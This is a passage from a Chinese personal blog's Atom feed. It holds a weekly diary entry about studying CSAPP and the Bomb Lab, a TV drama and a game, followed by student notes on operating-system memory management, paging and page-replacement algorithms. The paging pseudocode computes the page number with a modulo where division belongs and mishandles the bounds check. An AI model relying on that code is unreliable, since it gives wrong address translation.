      <category term="CSAPP" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%98%E9%BE%99%E6%9C%AF/CSAPP/"/>
    
    
      <category term="读书笔记:技术" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E6%8A%80%E6%9C%AF/"/>
    
      <category term="CSAPP" scheme="http://yoursite.com/tags/CSAPP/"/>
    
      <category term="Lab" scheme="http://yoursite.com/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>时与光W_202006-4</title>
    <link href="http://yoursite.com/2020/06/28/%E6%97%B6%E4%B8%8E%E5%85%89W_202006-4/"/>
    <id>http://yoursite.com/2020/06/28/%E6%97%B6%E4%B8%8E%E5%85%89W_202006-4/</id>
    <published>2020-06-28T12:41:22.000Z</published>
    <updated>2020-06-28T14:16:47.560Z</updated>
    
    <content type="html"><![CDATA[<p>2020年6月22日 ~ 28日.</p><p>开始个人小结计划</p><p>学习 CSAPP </p><p>追剧, 玩游戏</p><a id="more"></a><h2 id="时与光-个人小结计划"><a href="#时与光-个人小结计划" class="headerlink" title="时与光:个人小结计划"></a>时与光:个人小结计划</h2><p>听说每天坚持写技术博客有利于知识巩固与技能加深, 自觉没有每天坚持的能力, 想了个折中的办法: 以一周为阶段定期总结. 当然, 每月月底, 每半年, 每年也要整理记录! </p><p>主要内容希望自己能够以技术学习, 生活记录为主. 反正也不会有别人看, 就写的简略且随性一些. </p><p><strong>以下是每次小结的规范:</strong></p><ol><li>小结分为: 周记, 月记, 半年总结, 年度总结 四种, 后缀分别以<code>w,m,h,y</code>标识.</li><li>命名格式例: <ol><li>周记: <code>时与光W_202006-4</code> 末位数字代表本月第几周(周日为准)</li><li>月记: <code>时与光M_202006</code></li><li>半年记: <code>时与光H_2020上半年</code></li><li>年度记: <code>时与光Y_2020年度总结</code></li></ol></li><li>内容包括: <ol><li>技术学习成果与产出总结</li><li>记录生活, 如旅游 读书 观影 游戏</li><li>突如其来的想法</li><li>下一阶段的展望</li></ol></li></ol><h2 id="学习CSAPP"><a href="#学习CSAPP" class="headerlink" title="学习CSAPP"></a>学习CSAPP</h2><p>项目地址:</p><p><a href="https://github.com/luy-0/CS-APP-LABs" target="_blank" rel="noopener">https://github.com/luy-0/CS-APP-LABs</a></p><p>对CSAPP这本书垂涎已久, 趁着疫情的期末大把空闲时间和两位同学组队学习CSAPP以及CMU的15-213课程. 更多学习情况参看README部分.</p><p>本周着重于完成机器级别编程部分, 以及课程配套实验中的Bomb Lab, 这是一个通过 gdb 查看可执行文件的汇编代码, 并且推导出炸弹拆除的密钥. 在这几天习得了基本的汇编代码阅读能力, gdb 的基本运用能力, 对C计算机底层运算的实现有了更深的理解. </p><p>这个Lab真是让人又爱又恨, 每拆除一个炸弹的时候成就感满满, 但是对着汇编代码死活瞪不出逻辑的暴躁和无奈…</p><p>机器级别编程 是指 使用汇编代码完成函数操作. 主要学习内容包括 控制机器执行, 执行过程 数据的存储(数组 结构 联合) 以及其他进阶部分. 其中关于缓存区溢出, 栈攻击, 浮点代码等部分掌握的不好.</p><h2 id="追剧"><a href="#追剧" class="headerlink" title="追剧"></a>追剧</h2><p>这一周在追《隐蔽的角落》 . 改编自紫金陈的推理小说《坏小孩》，讲述了在沿海小城三个孩子(朱朝阳, 岳普, 严良) 在景区游玩时无意间拍摄记录了一次谋杀(张东升, 秦昊饰)，想借机敲诈来筹钱，以及随后发生的一连串的故事。大结局播完豆瓣评分依旧为9.0</p><p>主要是周围同学都在追哈哈哈, 感叹国产网剧真的很成熟了, 前几集导演对于节奏把握的很好, 中间叙事稍有平淡, 最后一部分还没看😂  配乐挺用心, 虽然我听不懂后现代, 但是还是有被情绪感染到. 在展现上制片组的细致程度令人感动, 例如张东升海夜追朝阳时对着脚步印, 例如试卷和板书上的题目真的是初中知识点 , 竟然有一点点对着美剧扣细节的感觉了. 演员也实力诠释, 秦昊的演技令人背后发凉, 小朋友的演技也很稳啊~ 朝阳那种说的少想得多的内向好学生非常真实, 普普的可爱是真的戏里戏外的可爱 ,就是太机灵懂事了, 牛逼的让人心疼(话说我怎么总觉得她最后要黑化一类的?) 严良其实没有很好地演出想象里的小痞子气, 缺点那种坏味.一部很优秀的国产剧, 拯救了我被言情耽改剧摧毁的信心~ (没错我就是指ssss和cql)</p><p>希望结局能够依旧精彩吧! </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/XGYW%25K%7DKW%40MFX%7BQNNHBI95W.jpg" alt=""></p><h2 id="玩游戏"><a href="#玩游戏" class="headerlink" title="玩游戏"></a>玩游戏</h2><p>嗯…最近又入了平安京的坑, MOBA真香:dog: 不过打了一周上了少属就没啥动力了… 快乐咸鱼佛系游戏, 竞技游戏嘛 心态放好就行了~</p><h2 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h2><p>继续CSAPP </p><p>开始刷LC</p><p>控制每日游戏时长</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年6月22日 ~ 28日.&lt;/p&gt;
&lt;p&gt;开始个人小结计划&lt;/p&gt;
&lt;p&gt;学习 CSAPP &lt;/p&gt;
&lt;p&gt;追剧, 玩游戏&lt;/p&gt;
    
    </summary>
    
    
      <category term="时与光" scheme="http://yoursite.com/categories/%E6%97%B6%E4%B8%8E%E5%85%89/"/>
    
    
      <category term="小结" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%BB%93/"/>
    
      <category term="周记" scheme="http://yoursite.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>操作系统之内存管理</title>
    <link href="http://yoursite.com/2020/06/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>http://yoursite.com/2020/06/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</id>
    <published>2020-06-09T01:14:11.000Z</published>
    <updated>2020-06-09T06:48:04.382Z</updated>
    
    <content type="html"><![CDATA[<p>本章将会涉及到</p><ol><li>基本内存管理</li><li>Segmentation    分段 </li><li>Swap    交换</li><li>⭐Virtual   虚拟内存</li><li>其他需要考虑的问题</li></ol><a id="more"></a><h2 id="基本内存管理"><a href="#基本内存管理" class="headerlink" title="基本内存管理"></a>基本内存管理</h2><p>本节会涉及到:</p><ol><li>储存层次</li><li>CPU利用率</li><li>重定位<ol><li>Base &amp; Limit</li><li>什么时候重定位</li></ol></li></ol><h3 id="储存层次"><a href="#储存层次" class="headerlink" title="储存层次"></a>储存层次</h3><p>参看计组部分, 不是重点, 略</p><h3 id="CPU利用率"><a href="#CPU利用率" class="headerlink" title="CPU利用率"></a>CPU利用率</h3><p>如果考虑到内存的存在, CPU的利用率还将会进一步降低.  如果CPU中同时存在 $n$ 个运行中的程序 (称为多道程序的度 degree) ,则 CPU利用率为</p><script type="math/tex; mode=display">1-P^n</script><p>其中 $P$ 是IO等待时间的占比</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124321.jpg" alt="1591668423275"></p><blockquote><ul><li>These  sizes allow 4 programs to be in memory at once. With an 80% average I/O wait, we have a CPU utilization of 1-0.8^4≈60%. </li><li>Adding another 16MB of memory allow 8 programs, thus raising the CPU utilization to 83%. </li><li>Adding yet another 16MB of memory allow 12 programs, only increase CPU utilization to 93%. </li><li>…97% </li></ul></blockquote><p>下图展示了实际CPU中的资源分配</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124332.jpg" alt="1591668467874"></p><ul><li>0-10秒内 仅Job1 在工作. CPU利用率为 $1-0.8^1=0.2$ 相当于执行了 $10\times0.2=2 min$</li><li>10-15秒内 Job1/2 在工作. CPU利用率为 $1-0.8^2=0.36$ 平均每个任务相当于执行了 $5\times\frac{1}{2}\times0.36=0.9 min$</li><li>15-20 秒内 Job1/2/3 在工作. CPU利用率为 $1-0.8^3=0.49$ 平均每个任务相当于执行了 $5\times\frac{1}{3}\times0.49=0.8 min$</li><li>……</li></ul><h3 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h3><p>程序本身包含的数据是从零开始<del>的异世界生活</del> 而在实际运行中, 几乎不可能物理地址恰好从零开始, 因此需要将程序中的逻辑地址(也叫相对地址) 转换成物理地址. 这在CPU中是由 MMU (内存控制单元) 完成的.</p><h4 id="基址与限址-Base-amp-Limit"><a href="#基址与限址-Base-amp-Limit" class="headerlink" title="基址与限址   Base &amp; Limit"></a>基址与限址   Base &amp; Limit</h4><p>Base &amp; Limit 都是作为寄存器储存在PCB中, 每个进程都有一个. </p><p>Base 是逻辑地址0 在物理地址空间中的地址(的指针) , 也就是该进程在内存空间中开始的地方. </p><p>Limit 是进程所拥有的最大地址<strong>数目</strong>, Base + Limit 是 进程的最大地址</p><blockquote><p>​    eg Base = 10000   Limit = 4000  ➡ 最大地址为 14000</p></blockquote><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124344.jpg" alt="重定位图"></p><p>如图, 逻辑地址先与limit比较, 无误后再加上base成为物理地址</p><h4 id="MMU"><a href="#MMU" class="headerlink" title="MMU"></a>MMU</h4><p>Memory Management Unit , 内存管理空间, 作用是将虚拟内存转化为实际的物理地址, 再将其送往数据Bus上.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124432.jpg" alt="mmu"></p><h4 id="什么时候发生重定位"><a href="#什么时候发生重定位" class="headerlink" title="什么时候发生重定位?"></a>什么时候发生重定位?</h4><p>一般来说有三种:</p><ol><li>编译时, 这种就要求编译之后的程序代码的地址必须是实际运行中的地址, 常用于直接烧录的嵌入式等.</li><li>载入时, 要求载入后程序在内存中的位置必定不变, 无法进行灵活地管理与切换</li><li>运行时, 支持交换 分页等操作</li></ol><hr><h2 id="Segmentation-分段"><a href="#Segmentation-分段" class="headerlink" title="Segmentation 分段"></a>Segmentation 分段</h2><p>在上述讨论中, 我们是把程序的所有东西整体放入内存中. 而事实上, 程序的数据包括代码段(Code), 数据段(Data), 堆栈段(Stack),….</p><p>可能出现的问题: 修改Data数据时误改了Code段; 批处理时可以复用代码段等.</p><p>所以采用分段.每一段的逻辑地址都从0 开始, 每一段都拥有自己的Base 与 Limit , 这些映射关系储存在段表中.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609082725.jpg" alt="分段"></p><h3 id="GDT-amp-LDT"><a href="#GDT-amp-LDT" class="headerlink" title="GDT &amp; LDT"></a>GDT &amp; LDT</h3><p>每个进程拥有自己的LDT (Local Descriptor Table) 用于储存进程中每个段的Base等数据.</p><p>OS 拥有一个GDT (Global  Descriptor Table) </p><p>存疑 GDT时用来干什么的?</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125624.jpg" alt=""></p><h3 id="段的大小"><a href="#段的大小" class="headerlink" title="段的大小"></a>段的大小</h3><p>一般 Inter 16K段, 每段拥有1 billion 32-bit words</p><h3 id="分段与换页的比较"><a href="#分段与换页的比较" class="headerlink" title="分段与换页的比较"></a>分段与换页的比较</h3><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125600.jpg" alt="比较"></p><hr><h2 id="Swap-交换"><a href="#Swap-交换" class="headerlink" title="Swap 交换"></a>Swap 交换</h2><p>本小节涉及到:</p><ol><li>交换的概念</li><li>碎片/空洞</li><li>⭐内存管理机制<ol><li>位图    bit map    </li><li>链表    list</li></ol></li><li>⭐内存的分配机制</li></ol><p>先前说到内存空间的大小远远不够支撑所有进程同时使用. 因此Swap 出现了, 基本思想是谁用, 内存资源给谁. 当另外一个进程需要CPU资源时, 将原先的进程撤出, 换入目标进程.</p><p>内存分区的可以分成固定大小, 缺点是会造成空间的浪费, 并且无法运行大于分区大小的程序. </p><p>分区大小也可以是可变的, 但是随着时间会有碎片(空洞, Holes) 的产生</p><h3 id="Holes-空洞"><a href="#Holes-空洞" class="headerlink" title="Holes 空洞"></a>Holes 空洞</h3><p>空洞的产生</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124358.jpg" alt=""></p><p>空洞还是难以清除的. 内存是处在高速变化中的, 试图将碎片合并为更大的内存空间片式必须要将目前的进程停滞. 对外表现为长达数十秒甚至分钟的机器假死, 是不可被忍受的.</p><h3 id="内存的管理机制"><a href="#内存的管理机制" class="headerlink" title="内存的管理机制"></a>内存的管理机制</h3><p>将内存划分为更加精细的等大片段, 并记录其是否处于使用中, 如下图</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124410.jpg" alt="内存管理"></p><h4 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h4><p>如图B, 1表示使用中, 0表示未使用.</p><p>pro: 便于管理, 修改只需要取非操作即可</p><p>con: 难于查找, 每次必须查找n位连续的0; 实际位图很大</p><h4 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h4><p>如图C, P表示process, H表示holes, 第二位表示开始位, 第三位表示长度.</p><p>pro: 便于查找, 只需要比较长度, 节约管理成本.</p><p>con: 难于管理, 归还内存时要合并空洞, 合并内存时要分裂空洞</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124419.jpg" alt="合并空洞"></p><h3 id="内存的分配机制"><a href="#内存的分配机制" class="headerlink" title="内存的分配机制"></a>内存的分配机制</h3><h4 id="First-fit"><a href="#First-fit" class="headerlink" title="First fit"></a>First fit</h4><p>从0开始找到第一个合适的</p><h4 id="Next-fit"><a href="#Next-fit" class="headerlink" title="Next fit"></a>Next fit</h4><p>从上一次查找结束的地方开始找到第一个合适的</p><h4 id="Best-fit"><a href="#Best-fit" class="headerlink" title="Best fit"></a>Best fit</h4><p>在所有空洞中找<strong>最略大于</strong>所需内存的空洞</p><h4 id="Worst-fit"><a href="#Worst-fit" class="headerlink" title="Worst fit"></a>Worst fit</h4><p>在所有空洞中找<strong>最大于</strong>所需内存的空洞</p><h4 id="Quick-fit"><a href="#Quick-fit" class="headerlink" title="Quick fit"></a>Quick fit</h4><p>随机查找空洞, 只要够用就安排</p><ul><li><p>Fist , Next , Quick 方式 , 只要找到能用的即可, 不考虑空洞体量是否与所需要的符合.</p></li><li><p>Best 问题:</p><ul><li>碎片产生的太多且小</li><li>查找过程太慢</li></ul></li><li><p>Worst 问题</p><ul><li>迅速消耗大空洞</li><li>查找过程太慢</li></ul></li><li><p>实际性能最好的是 Quick fit</p><p><del>这就是无招胜有招吗 👴就是风清扬, i了i了</del></p></li></ul><h2 id="Virtual-Memory-虚拟内存"><a href="#Virtual-Memory-虚拟内存" class="headerlink" title="Virtual Memory 虚拟内存"></a>Virtual Memory 虚拟内存</h2><p>本节包括:</p><ol><li>分页</li><li>多级页表<ol><li>页表每项对应大小</li><li>页表包括的内容</li></ol></li><li>TLB 快表</li><li><del>反转页表</del></li></ol><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>先前都是按照最大需要的内存来划分空间的. 实际上很多时候是用不到这些空间的. 因此我们在把每个进程(或者段)拆分, 当前使用中的部分在内存中, 其他部分放在磁盘中. </p><p>将进程(或段) 的虚拟空间地址分成一定大小的<strong>页(Page)</strong> , 称为分页.</p><p>将进程(或段) 的物理空间地址分成一定大小的<strong>页帧(Frame)</strong> </p><p>当进程发现所需要的数据所在的页不在内存, 而在磁盘中时, 会发生<strong>页面失效(Page Fault)</strong> , 并通过页面调度将内存中某一页调出, 调入目标页. </p><h4 id="分页过程"><a href="#分页过程" class="headerlink" title="分页过程"></a>分页过程</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125322.jpg" alt="分页"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页算法  伪代码</span></span><br><span class="line">address ad_lo <span class="comment">//逻辑地址,已知</span></span><br><span class="line">address ad_phy<span class="comment">//物理地址,待求</span></span><br><span class="line">address* Base<span class="comment">//已知</span></span><br><span class="line">size Limit<span class="comment">//已知</span></span><br><span class="line">size page_size<span class="comment">//每一页的大小, 一般与页帧大小相同,已知</span></span><br><span class="line">pageTable table[]<span class="comment">//页表,已知</span></span><br><span class="line"><span class="keyword">int</span> pageNo<span class="comment">//页号,未知</span></span><br><span class="line"><span class="keyword">int</span> frameNo<span class="comment">//页帧号,未知</span></span><br><span class="line"></span><br><span class="line">getAd_Phy()&#123;</span><br><span class="line"><span class="keyword">if</span> (ad_lo &gt; *(Base + Limit) )</span><br><span class="line"><span class="keyword">throw</span> error(<span class="string">"地址越界!"</span>)</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">pageNo = ad_lo % page_size<span class="comment">//页号</span></span><br><span class="line">offset = ad_lo - pageNo * page_size<span class="comment">//页内偏移量</span></span><br><span class="line">frameNo = table[PageNo]<span class="comment">//页帧号</span></span><br><span class="line"><span class="keyword">if</span> (frameNo == null)</span><br><span class="line"><span class="keyword">throw</span> error(<span class="string">"页面失效!"</span>)</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">ad_phy = frameNo * page_size + offset</span><br><span class="line"><span class="keyword">return</span> ad_phy</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/img_1173.png" alt="练习"></p><h4 id="分页场景"><a href="#分页场景" class="headerlink" title="分页场景"></a>分页场景</h4><ol><li><p>进程创建时</p><ul><li><p>确定程序体量</p></li><li><p>创建进程表</p></li></ul></li><li><p>程序执行时</p><ul><li><p>MMU刷新</p></li><li><p>TLB刷新</p></li></ul></li><li><p>页面失效时</p><ul><li>判断失效页面, 确定调入页面</li><li>确定并调出调出页面</li><li>调入调入页面</li></ul></li><li><p>程序结束</p><ul><li>释放资源</li></ul></li></ol><h3 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h3><p>实际上页表很大($2^{32}$), 但是我们要求它快!</p><ol><li><p>将页表放在硬件(寄存器)中</p><p>……用脚趾头想都不现实</p><p><del>万一哪天科技突飞猛进了后人看到这篇博客会是什么想法呢</del></p></li><li><p>页表放在软件(内存)中</p><p>效率低</p></li></ol><p>多级列表,字面意思,  应该很好懂.</p><p><strong>每项的大小</strong></p><div class="table-container"><table><thead><tr><th>PT1</th><th>PT2</th><th>Offset</th></tr></thead><tbody><tr><td>10 $bits$</td><td>10  $bits$</td><td>12  $bits$</td></tr></tbody></table></div><p>那么总虚拟地址空间大小为 $2^{10+10+12} = 4G$ ,一级页表中每项对应的实际上是 $2^{10+12} = 4M$ 地址空间, 二级页表实际上是$2^{12} = 4K$</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125441.jpg" alt="页面大小"></p><p><strong>实际上页表还包括</strong></p><ol><li>Page frame number 页帧号</li><li>Present /absent  若为1 ,表示该页对应物理地址在内存中</li><li>Protection  标识访问权限, R/W/X</li><li>Modified    标识是否修改过, 若1, 调出时需要写入磁盘</li><li>Referenced  最近是否被访问, 用于页面调度算法的参考</li><li>Caching disabled   不懂</li></ol><h3 id="TLB-快表"><a href="#TLB-快表" class="headerlink" title="TLB 快表"></a>TLB 快表</h3><p>根据二八原则, 20% 的页面被访问80%次, 将它们记录在硬件上, 直查物理地址</p><p>剩下的80%再跑去页表查</p><p>这一块硬件称为 <strong>转换检测缓冲区  (Translation Lookaside Buffers, TLB, 又称快表)</strong></p><p>TLB包括的内容与页表大致相同, 但是更快!</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125452.jpg" alt="内容"></p><h3 id="反转页表"><a href="#反转页表" class="headerlink" title="反转页表"></a>反转页表</h3><p>没听, 好像是从页帧转页, 但是不重要</p><h2 id="页面调度算法"><a href="#页面调度算法" class="headerlink" title="页面调度算法"></a>页面调度算法</h2><p>本节包括</p><ol><li>最优PRA</li><li>NRU  最近未使用</li><li>FIFO  </li><li>SC  第二机会</li><li>Clock PRA</li><li>LRU<ol><li>硬件实现</li><li>软件实现</li></ol></li><li>Working Set</li><li>WSClock </li></ol><p>因为很重要所以单独拉出来一点讲了</p><ul><li><p>刚才提到页面失效,  并随后进行页面调度. 调入的页面是明确的, 但是把什么调出呢? 这就是页面调度算法<strong>(Page Replacement Algorithms ,PRA)</strong></p></li><li><p>除了页面失效外在别的地方也有使用 例如</p><ul><li>缓存</li><li>搜索引擎的热点</li></ul></li></ul><h3 id="最优PRA"><a href="#最优PRA" class="headerlink" title="最优PRA"></a>最优PRA</h3><p>每次都将未来最远不会用到的调走</p><p><del>废话但是我怎么知道啷个是未来不会用到的啊</del></p><p>所以这个算法没有实际意义, 用于评价其他算法的性能</p><h3 id="Not-Recently-Used-NRU-最近未使用"><a href="#Not-Recently-Used-NRU-最近未使用" class="headerlink" title="Not Recently Used (NRU, 最近未使用)"></a>Not Recently Used (NRU, 最近未使用)</h3><p>每个页码都有 Reference bit, Modified bit  (是否被访问, 修改位)</p><p>按照以下顺序调出:</p><ol><li>not referenced, not modified </li><li>not referenced, modified</li><li>referenced, not modified </li><li>referenced, modified</li></ol><h3 id="FIFO-PRA"><a href="#FIFO-PRA" class="headerlink" title="FIFO PRA"></a>FIFO PRA</h3><p>先进先出</p><p>con: 经常将访问过, 修改过的位调出</p><p>下面是它的改进</p><h3 id="Second-Chance-PRA"><a href="#Second-Chance-PRA" class="headerlink" title="Second Chance PRA"></a>Second Chance PRA</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;SC PRA</span><br><span class="line">while(页面到队头)&#123;</span><br><span class="line">if(referenceBit &#x3D;&#x3D; 0)</span><br><span class="line">调出;</span><br><span class="line">else &#123;</span><br><span class="line">referenceBit &#x3D; 0;</span><br><span class="line">页面出队;</span><br><span class="line">页面入队; &#x2F;&#x2F;就是扔回队尾了</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="The-Clock-PRA"><a href="#The-Clock-PRA" class="headerlink" title="The Clock  PRA"></a>The Clock  PRA</h3><p>原理相同, 只是改成循环, 改变指针来仿造队列移动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">while(指针到本页了)&#123;</span><br><span class="line">if(referenceBit &#x3D;&#x3D; 0)</span><br><span class="line">调出;</span><br><span class="line">else &#123;</span><br><span class="line">referenceBit &#x3D; 0;</span><br><span class="line">指针后移;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125508.jpg" alt="clock"></p><h3 id="Least-Recently-Used-LRU-最近最少使用"><a href="#Least-Recently-Used-LRU-最近最少使用" class="headerlink" title="Least Recently Used (LRU, 最近最少使用)"></a>Least Recently Used (LRU, 最近最少使用)</h3><p>是NRU的升级版, 根据<a href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F%E5%B1%80%E9%83%A8%E6%80%A7%E5%8E%9F%E7%90%86/15572003?fr=aladdin" target="_blank" rel="noopener">程序局部性原理</a>, 最近被使用的往往将会再次被使用.</p><p>实现方式:</p><ol><li>建立一个最近使用页面的集合</li><li>在每个条目中保留计数器, 每次选择最低的(最少), 定期清零(最近)</li></ol><p><strong>模拟LRU</strong></p><h4 id="硬件模拟"><a href="#硬件模拟" class="headerlink" title="硬件模拟"></a>硬件模拟</h4><ul><li><p>当访问 n 时, 第 n 列置0 , 第 n 行其他位置1</p></li><li><p>当需要调出时, 调出每行和最少的, 如果相同, 调出….</p></li></ul><p>存疑: 不应该是调出离自己最远的吗.? 向下数的第一个?</p><p><strong>缺点</strong></p><p>开销大</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125518.jpg" alt="矩阵"></p><h4 id="软件模拟"><a href="#软件模拟" class="headerlink" title="软件模拟"></a>软件模拟</h4><ul><li>每个页都拥有自己的标识数,每个一段时间将访问的页面对应的标识数的某位置1, 其他置0, 位数后移</li><li>调出时选择标识值最小的调出</li></ul><h3 id="Working-Set"><a href="#Working-Set" class="headerlink" title="Working Set"></a>Working Set</h3><p>没听, 好像是把页面集中成集再调度</p><h3 id="WSClock-PRA"><a href="#WSClock-PRA" class="headerlink" title="WSClock PRA"></a>WSClock PRA</h3><p>类似上面, 采用时钟模拟</p><h2 id="其他需要考虑的"><a href="#其他需要考虑的" class="headerlink" title="其他需要考虑的"></a>其他需要考虑的</h2><h3 id="Local-vs-Global-Allocation-Policies"><a href="#Local-vs-Global-Allocation-Policies" class="headerlink" title="Local vs Global Allocation Policies"></a>Local vs Global Allocation Policies</h3><p>全局调度页面会使得一段时间后内存的利用趋近于实际进程所需的比例.</p><h3 id="Load-Control"><a href="#Load-Control" class="headerlink" title="Load Control"></a>Load Control</h3><p>当 <strong>PFF (page fault frequency 页面失效频率)</strong> 过高时, 主动减少使用内存的进程.</p><p><del>让一部分进程先跑起来</del></p><h3 id="Page-Size"><a href="#Page-Size" class="headerlink" title="Page Size"></a>Page Size</h3><p>small page size (typically 4k or 8k):</p><p>Advantages:</p><ul><li>减少内部碎片</li><li>更好地适合各种数据结构和代码段</li><li>减少内存中未使用的程序</li></ul><p>Disadvantages:</p><ul><li>程序需要很多页，因此产生巨大的页表</li><li>传输小页所需的时间几乎与传输大页所需的时间相同, 但传输效率低</li></ul><h3 id="Cleaning-Policy"><a href="#Cleaning-Policy" class="headerlink" title="Cleaning Policy"></a>Cleaning Policy</h3><p>为了保证在新进程创建的时候有足够的空白页面支持, 必须时刻保证内存中有足够的空白页.</p><p> <strong>paging daemon （分页守护进程）</strong>:当空白页面不足时, 会主动调出页, 但不调入页帧.</p><p>也可以使用clock</p><h2 id="附-Page-Fault-Handling"><a href="#附-Page-Fault-Handling" class="headerlink" title="附: Page Fault Handling"></a>附: Page Fault Handling</h2><ol><li>trap 进内核, 保存PC</li><li>保存进程寄存器</li><li>OS 确定调入页</li><li>OS 确定调出页</li><li>若调出页修改过(dirty), 需要写入磁盘</li><li>调入调入页</li><li>更新页表</li><li>恢复到页面失效的指令</li><li>恢复进程</li><li>恢复寄存器, 恢复PC</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本章将会涉及到&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;基本内存管理&lt;/li&gt;
&lt;li&gt;Segmentation    分段 &lt;/li&gt;
&lt;li&gt;Swap    交换&lt;/li&gt;
&lt;li&gt;⭐Virtual   虚拟内存&lt;/li&gt;
&lt;li&gt;其他需要考虑的问题&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="专业课" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>操作系统之进程间通信</title>
